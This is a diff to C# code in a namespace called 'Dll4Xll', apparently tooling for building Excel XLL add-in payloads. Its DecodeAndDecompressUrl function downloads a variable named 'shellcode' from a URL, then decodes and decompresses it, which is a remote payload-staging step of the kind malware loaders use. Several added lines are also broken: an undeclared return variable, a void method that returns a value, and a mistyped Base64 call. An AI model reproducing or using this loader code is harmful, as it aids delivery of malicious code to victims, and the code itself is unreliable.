@@ -44,7 +44,7 @@ namespace Dll4Xll
             }
         }
 
-        public static void DecodeAndDecompressUrl(string url)
+        public static byte[] DecodeAndDecompressUrl(string url)
         {
             byte[] shellcode;
             using (WebClient client = new WebClient())
@@ -64,8 +64,10 @@ namespace Dll4Xll
                     shellcode = outputStream.ToArray();
                 }
             }
+            return shellcode;
         }
 
+        // Changes here to return value, storing as input bytes and returning
         public static byte[] Compress(byte[] inputBytes)
         {
             using (MemoryStream ms = new MemoryStream())
@@ -74,10 +76,12 @@ namespace Dll4Xll
                 {
                     compressionStream.Write(inputBytes, 0, inputBytes.Length);
                 }
-                return ms.ToArray();
+                inputBytes = ms.ToArray();
             }
+            return inputBytes;
         }
 
+        // Changed return to "decompressed"
         public static byte[] Decompress(byte[] inputBytes)
         {
             using (MemoryStream ms = new MemoryStream(inputBytes))
@@ -87,18 +91,31 @@ namespace Dll4Xll
                     using (MemoryStream outputStream = new MemoryStream())
                     {
                         decompressionStream.CopyTo(outputStream);
-                        return outputStream.ToArray();
+                        decompressed = outputStream.ToArray();
                     }
                 }
             }
+            return decompressed;
         }
 
+        // Should make these "EncodeToBase64File" to differentiate from Url
         public static void EncodeToBase64(string inputFile, string outputFile)
         {
             byte[] inputBytes = File.ReadAllBytes(inputFile);
             string base64Encoded = Convert.ToBase64String(inputBytes);
             File.WriteAllText(outputFile, base64Encoded);
         }
+
+        public static void EncodeToBase64Url(string url)
+        {
+            using (WebClient client = new WebClient())
+            {
+                string String = client.DownloadString(url);
+                byte[] inputBytes = Convert.ToBase64String(String);
+                return inputBytes;
+            }
+        }
+
 
 
         public static void DecodeFromBase64(string inputFile, string outputFile)
